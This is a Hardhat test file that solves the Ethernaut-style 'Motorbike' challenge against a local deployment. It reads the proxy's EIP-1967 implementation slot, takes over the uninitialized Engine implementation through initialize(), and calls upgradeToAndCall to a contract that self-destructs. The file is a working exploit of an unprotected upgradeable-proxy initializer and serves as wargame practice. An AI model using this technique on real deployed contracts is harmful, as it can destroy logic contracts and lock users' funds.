import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Motorbike', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let motorbikeContract: Contract;
  let engineContract: Contract;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    const [EngineFactory, MotorbikeFactory] = await Promise.all([
      ethers.getContractFactory('Engine'),
      ethers.getContractFactory('Motorbike'),
    ]);

    engineContract = await EngineFactory.connect(owner).deploy();
    await engineContract.deployed();

    motorbikeContract = await MotorbikeFactory.connect(owner).deploy(
      engineContract.address
    );
    await motorbikeContract.deployed();
  });

  async function getEngineHorsePower(): Promise<number> {
    const iface = new ethers.utils.Interface([
      'function horsePower() returns (uint256)',
    ]);

    const data = iface.encodeFunctionData('horsePower');

    const horsePower: any = await attacker.call({
      to: motorbikeContract.address,
      data,
    });

    return horsePower;
  }

  it('attack', async () => {
    // GET ENGINE IMPLEMENTATION ADDRESS FIRST
    const IMPLEMENTATION_SLOT = utils.arrayify(
      '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
    );

    const implementationAddressSlotValue = await provider.getStorageAt(
      motorbikeContract.address,
      IMPLEMENTATION_SLOT
    );

    const implementationAddress = utils.getAddress(
      '0x' + implementationAddressSlotValue.substring(26)
    );

    const EngineFactory = await ethers.getContractFactory('Engine');
    const engine = await EngineFactory.attach(implementationAddress);

    // CALL INITIALIZE AND BE THE UPGRADER
    let tx = await engine.connect(attacker).initialize();
    await tx.wait();

    // Deploy a faulty engine
    const FaultyEngineFactory = await ethers.getContractFactory('FaultyEngine');
    const faultyEngine = await FaultyEngineFactory.deploy();
    await faultyEngine.deployed();

    const iface = new ethers.utils.Interface(['function seppuku()']);
    const data = iface.encodeFunctionData('seppuku');

    // UPGRADE IMPLENTATION TO A FAULTY ONE AND CALL SELFDESTRUCT
    tx = await engine
      .connect(attacker)
      .upgradeToAndCall(faultyEngine.address, data);
    await tx.wait();

    // ENGINE IS USELESS
    expect(await getEngineHorsePower()).to.equal('0x');
  });
});
